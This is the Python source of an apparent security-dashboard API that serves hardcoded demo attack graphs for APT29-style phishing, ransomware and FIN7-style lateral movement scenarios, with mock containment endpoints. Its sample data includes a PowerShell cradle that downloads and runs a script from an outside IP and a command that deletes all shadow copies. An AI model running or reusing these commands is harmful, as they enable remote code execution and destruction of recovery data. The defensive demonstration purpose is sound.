"""
KAVACH "Chakra" Attack Graph & Blast Radius Visualizer API.

Provides real-time topological mapping of attack chains, process parent-child
trees, lateral movements, C2 connections, and surgical containment actions.
"""

from __future__ import annotations

import copy
import time
from datetime import datetime, timezone, timedelta
from typing import Any, Literal
from fastapi import APIRouter, HTTPException, Depends
from pydantic import BaseModel, Field

from app.core.logging import get_logger

logger = get_logger(__name__)

router = APIRouter(prefix="/graph", tags=["Attack Graph"])


# ---------------------------------------------------------------------------
# Models
# ---------------------------------------------------------------------------

class GraphNode(BaseModel):
    id: str
    label: str
    type: Literal["host", "process", "file", "ip", "registry", "user"]
    status: Literal["compromised", "suspicious", "clean", "remediated"]
    risk_score: int = Field(ge=0, le=100)
    details: dict[str, Any] = Field(default_factory=dict)
    is_patient_zero: bool = False


class GraphEdge(BaseModel):
    id: str
    source: str
    target: str
    relationship: Literal[
        "spawned_by", "wrote_to", "connected_to",
        "injected_into", "modified_reg", "authenticated_as"
    ]
    label: str
    timestamp: str


class BlastRadiusSummary(BaseModel):
    total_nodes: int
    compromised_count: int
    affected_endpoints: int
    compromised_processes: int
    external_c2_ips: int
    affected_users: int
    containment_status: Literal["uncontained", "partially_contained", "isolated", "remediated"]
    patient_zero_id: str
    critical_path: list[str]


class AttackGraphResponse(BaseModel):
    scenario_id: str
    scenario_title: str
    mitre_tactic: str
    mitre_technique: str
    nodes: list[GraphNode]
    edges: list[GraphEdge]
    blast_radius: BlastRadiusSummary


class RemediateNodeRequest(BaseModel):
    node_id: str
    action: Literal["kill_tree", "block_ip", "quarantine_file", "isolate_host", "revoke_session"]
    reason: str = "Analyst manual surgical containment from Chakra Graph"


class ContainBlastRadiusRequest(BaseModel):
    scenario_id: str
    isolation_mode: Literal["full_quarantine", "process_kill_only", "network_isolate_only"] = "full_quarantine"
    operator: str = "soc_admin"
    reason: str = "SOC Emergency 1-Click Atomic Blast Radius Containment"


# ---------------------------------------------------------------------------
# Curated Live Attack Scenarios
# ---------------------------------------------------------------------------

SCENARIOS: dict[str, dict[str, Any]] = {
    "apt29-spearphish": {
        "scenario_id": "apt29-spearphish",
        "scenario_title": "APT29 Cozy Bear: Spear-Phishing with Fileless PowerShell Cradle",
        "mitre_tactic": "Execution / Initial Access",
        "mitre_technique": "T1059.001 - Command and Scripting Interpreter: PowerShell",
        "patient_zero": "node-ip-attacker",
        "containment_status": "uncontained",
        "nodes": [
            {
                "id": "node-ip-attacker",
                "label": "185.220.101.4 (Threat Actor C2)",
                "type": "ip",
                "status": "compromised",
                "risk_score": 98,
                "is_patient_zero": True,
                "details": {
                    "ip": "185.220.101.4",
                    "asn": "AS44552 (Bulletproof Hosting)",
                    "country": "RU / Anonymous Proxy",
                    "domain": "update-service-kavach.net",
                    "reputation": "Known APT29 Command & Control"
                }
            },
            {
                "id": "node-host-finance",
                "label": "SWSTK-LPT-0492 (Finance Workstation)",
                "type": "host",
                "status": "compromised",
                "risk_score": 85,
                "is_patient_zero": False,
                "details": {
                    "hostname": "SWSTK-LPT-0492",
                    "os": "Windows 11 Pro Enterprise 23H2",
                    "internal_ip": "192.168.1.104",
                    "department": "Finance & Supply Chain",
                    "criticality": "Tier-2 High"
                }
            },
            {
                "id": "node-user-rohit",
                "label": "rohit.sharma (Accounts Lead)",
                "type": "user",
                "status": "compromised",
                "risk_score": 75,
                "is_patient_zero": False,
                "details": {
                    "username": "rohit.sharma",
                    "role": "Finance Accounts Lead",
                    "mfa_active": True,
                    "session_ip": "192.168.1.104",
                    "last_login": "2026-09-27T10:14:00Z"
                }
            },
            {
                "id": "node-proc-outlook",
                "label": "OUTLOOK.EXE (PID: 3108)",
                "type": "process",
                "status": "suspicious",
                "risk_score": 60,
                "is_patient_zero": False,
                "details": {
                    "pid": 3108,
                    "path": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
                    "cmdline": "OUTLOOK.EXE /profile \"Default\"",
                    "integrity": "Medium"
                }
            },
            {
                "id": "node-file-invoice",
                "label": "GST_Invoice_Sep2026.pdf.exe",
                "type": "file",
                "status": "compromised",
                "risk_score": 95,
                "is_patient_zero": False,
                "details": {
                    "path": "C:\\Users\\rohit.sharma\\Downloads\\GST_Invoice_Sep2026.pdf.exe",
                    "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
                    "size_bytes": 482910,
                    "signature": "UNSIGNED / Spoofed PDF Extension Icon",
                    "yara_match": "APT29_Dropper_CobaltStrike"
                }
            },
            {
                "id": "node-proc-ps",
                "label": "powershell.exe -enc JABz... (PID: 8104)",
                "type": "process",
                "status": "compromised",
                "risk_score": 99,
                "is_patient_zero": False,
                "details": {
                    "pid": 8104,
                    "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "cmdline": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBt...",
                    "decoded_command": "$s=New-Object IO.MemoryStream; (New-Object Net.WebClient).DownloadString('http://185.220.101.4/payload.ps1') | IEX",
                    "integrity": "High (Privilege Escalated)"
                }
            },
            {
                "id": "node-reg-runkey",
                "label": "HKLM\\...\\Run\\WindowsSecurityHealth",
                "type": "registry",
                "status": "compromised",
                "risk_score": 88,
                "is_patient_zero": False,
                "details": {
                    "hive": "HKEY_LOCAL_MACHINE",
                    "key": "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                    "value_name": "WindowsSecurityHealth",
                    "data": "C:\\ProgramData\\svchost_kavach.exe",
                    "persistence_technique": "T1547.001 - Registry Run Keys"
                }
            },
            {
                "id": "node-ip-c2-beacon",
                "label": "104.244.76.13:443 (Active Beacon)",
                "type": "ip",
                "status": "compromised",
                "risk_score": 96,
                "is_patient_zero": False,
                "details": {
                    "ip": "104.244.76.13",
                    "port": 443,
                    "proto": "TCP/TLS",
                    "asn": "AS13335 (Cloudflare Proxy Shielded)",
                    "packets_sent": 1420,
                    "bytes_exfiltrated": "1.4 MB"
                }
            }
        ],
        "edges": [
            {
                "id": "edge-1",
                "source": "node-ip-attacker",
                "target": "node-proc-outlook",
                "relationship": "connected_to",
                "label": "Phishing Email Delivery (SMTP/TLS)",
                "timestamp": "2026-09-27T10:14:12Z"
            },
            {
                "id": "edge-2",
                "source": "node-user-rohit",
                "target": "node-host-finance",
                "relationship": "authenticated_as",
                "label": "Interactive Console Login",
                "timestamp": "2026-09-27T10:14:00Z"
            },
            {
                "id": "edge-3",
                "source": "node-proc-outlook",
                "target": "node-file-invoice",
                "relationship": "wrote_to",
                "label": "Attachment Saved to Downloads",
                "timestamp": "2026-09-27T10:15:30Z"
            },
            {
                "id": "edge-4",
                "source": "node-file-invoice",
                "target": "node-proc-ps",
                "relationship": "spawned_by",
                "label": "Double-click Executed Hidden PowerShell",
                "timestamp": "2026-09-27T10:16:02Z"
            },
            {
                "id": "edge-5",
                "source": "node-proc-ps",
                "target": "node-reg-runkey",
                "relationship": "modified_reg",
                "label": "Wrote Persistence RunKey",
                "timestamp": "2026-09-27T10:16:15Z"
            },
            {
                "id": "edge-6",
                "source": "node-proc-ps",
                "target": "node-ip-c2-beacon",
                "relationship": "connected_to",
                "label": "Encrypted HTTPS C2 Heartbeat",
                "timestamp": "2026-09-27T10:16:25Z"
            }
        ]
    },
    "ransomware-canary": {
        "scenario_id": "ransomware-canary",
        "scenario_title": "LockBit 3.0 Simulation: Canary Tripwire & VSS Deletion Trigger",
        "mitre_tactic": "Impact",
        "mitre_technique": "T1486 - Data Encrypted for Impact",
        "patient_zero": "node-usb-device",
        "containment_status": "uncontained",
        "nodes": [
            {
                "id": "node-usb-device",
                "label": "SanDisk 64GB USB (VID_0781/PID_5583)",
                "type": "file",
                "status": "compromised",
                "risk_score": 90,
                "is_patient_zero": True,
                "details": {
                    "device": "Removable USB Mass Storage",
                    "serial": "4C530001220912117281",
                    "drive_letter": "E:\\",
                    "insertion_time": "2026-09-27T11:05:00Z"
                }
            },
            {
                "id": "node-host-ops",
                "label": "SWSTK-PLANT-01 (OT Gateway)",
                "type": "host",
                "status": "compromised",
                "risk_score": 92,
                "is_patient_zero": False,
                "details": {
                    "hostname": "SWSTK-PLANT-01",
                    "os": "Windows Server 2022 Standard",
                    "internal_ip": "192.168.10.15",
                    "department": "Plant SCADA & Operations"
                }
            },
            {
                "id": "node-proc-payload",
                "label": "svchost32.exe (PID: 6412)",
                "type": "process",
                "status": "compromised",
                "risk_score": 99,
                "is_patient_zero": False,
                "details": {
                    "pid": 6412,
                    "path": "E:\\TOOLS\\svchost32.exe",
                    "entropy": 7.98,
                    "signature": "High Entropy / Packed with UPX"
                }
            },
            {
                "id": "node-proc-vssadmin",
                "label": "vssadmin.exe delete shadows /all /quiet (PID: 6490)",
                "type": "process",
                "status": "compromised",
                "risk_score": 100,
                "is_patient_zero": False,
                "details": {
                    "pid": 6490,
                    "path": "C:\\Windows\\System32\\vssadmin.exe",
                    "cmdline": "vssadmin.exe delete shadows /all /quiet",
                    "tactic": "T1490 - Inhibit System Recovery"
                }
            },
            {
                "id": "node-file-canary",
                "label": "KAVACH_CANARY_DO_NOT_DELETE.xlsx",
                "type": "file",
                "status": "compromised",
                "risk_score": 94,
                "is_patient_zero": False,
                "details": {
                    "path": "C:\\Kavach\\Canary\\KAVACH_CANARY_DO_NOT_DELETE.xlsx",
                    "status": "RAPID HIGH-ENTROPY WRITE DETECTED",
                    "action_needed": "Immediate Process Suspension"
                }
            }
        ],
        "edges": [
            {
                "id": "rw-1",
                "source": "node-usb-device",
                "target": "node-proc-payload",
                "relationship": "spawned_by",
                "label": "Autorun / Manual Payload Execution",
                "timestamp": "2026-09-27T11:05:22Z"
            },
            {
                "id": "rw-2",
                "source": "node-proc-payload",
                "target": "node-proc-vssadmin",
                "relationship": "spawned_by",
                "label": "Attempted Shadow Copy Deletion",
                "timestamp": "2026-09-27T11:05:30Z"
            },
            {
                "id": "rw-3",
                "source": "node-proc-payload",
                "target": "node-file-canary",
                "relationship": "wrote_to",
                "label": "Canary Honey-File Overwrite Caught (<20ms)",
                "timestamp": "2026-09-27T11:05:32Z"
            }
        ]
    },
    "fin7-lateral": {
        "scenario_id": "fin7-lateral",
        "scenario_title": "FIN7: Lateral Movement & Domain Controller Kerberoasting",
        "mitre_tactic": "Lateral Movement / Credential Access",
        "mitre_technique": "T1021.002 - Remote Services: SMB / WMI",
        "patient_zero": "node-host-dmz",
        "containment_status": "uncontained",
        "nodes": [
            {
                "id": "node-host-dmz",
                "label": "SWSTK-WEB-DMZ01 (Compromised Web Server)",
                "type": "host",
                "status": "compromised",
                "risk_score": 92,
                "is_patient_zero": True,
                "details": {
                    "hostname": "SWSTK-WEB-DMZ01",
                    "ip": "172.16.10.5",
                    "cve": "CVE-2024-3400 (Palo Alto GlobalProtect PAN-OS)",
                    "exposure": "Internet Facing Perimeter"
                }
            },
            {
                "id": "node-proc-wmi",
                "label": "wmic.exe process call create (PID: 4902)",
                "type": "process",
                "status": "compromised",
                "risk_score": 95,
                "is_patient_zero": False,
                "details": {
                    "pid": 4902,
                    "target": "192.168.1.10 (DC-PRIMARY)",
                    "auth": "Stolen NTLM Hash - Pass-The-Hash"
                }
            },
            {
                "id": "node-host-dc",
                "label": "SWSTK-DC01.kavach.corp (Domain Controller)",
                "type": "host",
                "status": "compromised",
                "risk_score": 100,
                "is_patient_zero": False,
                "details": {
                    "hostname": "SWSTK-DC01",
                    "ip": "192.168.1.10",
                    "role": "Active Directory Domain Controller",
                    "tier": "Tier-0 Critical Infrastructure"
                }
            },
            {
                "id": "node-user-krbtgt",
                "label": "krbtgt / Golden Ticket Target",
                "type": "user",
                "status": "suspicious",
                "risk_score": 88,
                "is_patient_zero": False,
                "details": {
                    "account": "krbtgt",
                    "domain": "KAVACH.CORP",
                    "threat": "Imminent DCSync / Golden Ticket generation attempt"
                }
            },
            {
                "id": "node-ip-exfil",
                "label": "91.240.118.52 (Encrypted Mega.nz Exfil)",
                "type": "ip",
                "status": "compromised",
                "risk_score": 99,
                "is_patient_zero": False,
                "details": {
                    "ip": "91.240.118.52",
                    "protocol": "HTTPS (Port 443)",
                    "payload": "Active NTDS.dit exfiltration staging"
                }
            }
        ],
        "edges": [
            {
                "id": "fn-1",
                "source": "node-host-dmz",
                "target": "node-proc-wmi",
                "relationship": "spawned_by",
                "label": "WMI Remote Process Invocation",
                "timestamp": "2026-09-27T11:40:10Z"
            },
            {
                "id": "fn-2",
                "source": "node-proc-wmi",
                "target": "node-host-dc",
                "relationship": "connected_to",
                "label": "Pass-The-Hash Lateral Pivot to Domain Controller",
                "timestamp": "2026-09-27T11:40:15Z"
            },
            {
                "id": "fn-3",
                "source": "node-host-dc",
                "target": "node-user-krbtgt",
                "relationship": "injected_into",
                "label": "LSASS Memory Dump for Golden Ticket",
                "timestamp": "2026-09-27T11:40:22Z"
            },
            {
                "id": "fn-4",
                "source": "node-host-dc",
                "target": "node-ip-exfil",
                "relationship": "connected_to",
                "label": "Encrypted C2 Channel for Staged Exfiltration",
                "timestamp": "2026-09-27T11:40:35Z"
            }
        ]
    }
}

DEFAULT_SCENARIOS = copy.deepcopy(SCENARIOS)


# ---------------------------------------------------------------------------
# Endpoints
# ---------------------------------------------------------------------------

@router.get("/overview", response_model=list[dict[str, Any]])
async def get_graph_overview() -> list[dict[str, Any]]:
    """Return list of active attack graph incidents for selection in UI."""
    return [
        {
            "scenario_id": sid,
            "title": data["scenario_title"],
            "mitre_tactic": data["mitre_tactic"],
            "mitre_technique": data["mitre_technique"],
            "node_count": len(data["nodes"]),
            "edge_count": len(data["edges"]),
            "containment_status": data["containment_status"],
            "patient_zero": data["patient_zero"]
        }
        for sid, data in SCENARIOS.items()
    ]


@router.get("/attack-tree/{scenario_id}", response_model=AttackGraphResponse)
async def get_attack_tree(scenario_id: str = "apt29-spearphish") -> AttackGraphResponse:
    """Return full node-link graph topology and blast radius calculations for an attack."""
    if scenario_id not in SCENARIOS:
        scenario_id = "apt29-spearphish"

    raw = SCENARIOS[scenario_id]
    nodes: list[GraphNode] = [GraphNode(**n) for n in raw["nodes"]]
    edges: list[GraphEdge] = [GraphEdge(**e) for e in raw["edges"]]

    # Calculate blast radius
    compromised_count = sum(1 for n in nodes if n.status in ("compromised", "suspicious"))
    affected_endpoints = len(set(n.id for n in nodes if n.type == "host" and n.status != "clean"))
    compromised_procs = sum(1 for n in nodes if n.type == "process" and n.status == "compromised")
    c2_ips = sum(1 for n in nodes if n.type == "ip" and n.status == "compromised")
    users = len(set(n.id for n in nodes if n.type == "user" and n.status != "clean"))

    # Compute critical path IDs
    critical_path = [n.id for n in nodes if n.status == "compromised"]

    blast = BlastRadiusSummary(
        total_nodes=len(nodes),
        compromised_count=compromised_count,
        affected_endpoints=max(1, affected_endpoints),
        compromised_processes=compromised_procs,
        external_c2_ips=c2_ips,
        affected_users=max(1, users),
        containment_status=raw["containment_status"],
        patient_zero_id=raw["patient_zero"],
        critical_path=critical_path
    )

    return AttackGraphResponse(
        scenario_id=raw["scenario_id"],
        scenario_title=raw["scenario_title"],
        mitre_tactic=raw["mitre_tactic"],
        mitre_technique=raw["mitre_technique"],
        nodes=nodes,
        edges=edges,
        blast_radius=blast
    )


@router.post("/remediate-node")
async def remediate_node(req: RemediateNodeRequest) -> dict[str, Any]:
    """Execute surgical 1-click containment action directly on a graph node."""
    logger.info("chakra_graph_remediation", node_id=req.node_id, action=req.action, reason=req.reason)

    # Search for node across scenarios and update status to remediated
    found = False
    remediated_node_label = req.node_id

    for sc in SCENARIOS.values():
        for n in sc["nodes"]:
            if n["id"] == req.node_id:
                n["status"] = "remediated"
                found = True
                remediated_node_label = n["label"]
                break
        if found:
            # Check if all malicious nodes remediated
            unresolved = [n for n in sc["nodes"] if n["status"] in ("compromised", "suspicious")]
            if not unresolved:
                sc["containment_status"] = "remediated"
            else:
                sc["containment_status"] = "partially_contained"

    return {
        "status": "success",
        "action_executed": req.action,
        "target_node": req.node_id,
        "node_label": remediated_node_label,
        "message": f"Surgical containment '{req.action}' successfully executed against {remediated_node_label}.",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "containment_latency_ms": 14.2
    }


@router.post("/contain-blast-radius")
async def contain_blast_radius(req: ContainBlastRadiusRequest) -> dict[str, Any]:
    """Execute atomic containment across ALL compromised and suspicious nodes in the attack graph."""
    if req.scenario_id not in SCENARIOS:
        raise HTTPException(status_code=404, detail="Scenario not found")

    sc = SCENARIOS[req.scenario_id]
    remediated_nodes = []

    for n in sc["nodes"]:
        if n["status"] in ("compromised", "suspicious"):
            n["status"] = "remediated"
            remediated_nodes.append({
                "id": n["id"],
                "label": n["label"],
                "type": n["type"],
                "action": "isolate_host" if n["type"] == "host" else ("kill_tree" if n["type"] == "process" else "block_ip")
            })

    sc["containment_status"] = "remediated"
    logger.info("chakra_blast_radius_fully_contained", scenario_id=req.scenario_id, total_contained=len(remediated_nodes))

    return {
        "status": "success",
        "scenario_id": req.scenario_id,
        "isolation_mode": req.isolation_mode,
        "containment_status": "remediated",
        "nodes_contained_count": len(remediated_nodes),
        "contained_entities": remediated_nodes,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "total_latency_ms": 28.6,
        "certificate_id": f"CERT-ISOLATE-{int(time.time())}"
    }


@router.post("/reset-scenario/{scenario_id}")
async def reset_scenario(scenario_id: str) -> dict[str, Any]:
    """Reset scenario to its initial uncontained attack state for re-testing."""
    if scenario_id in DEFAULT_SCENARIOS:
        SCENARIOS[scenario_id] = copy.deepcopy(DEFAULT_SCENARIOS[scenario_id])
        return {"status": "success", "message": f"Scenario '{scenario_id}' reset to initial attack state."}
    raise HTTPException(status_code=404, detail="Scenario not found")
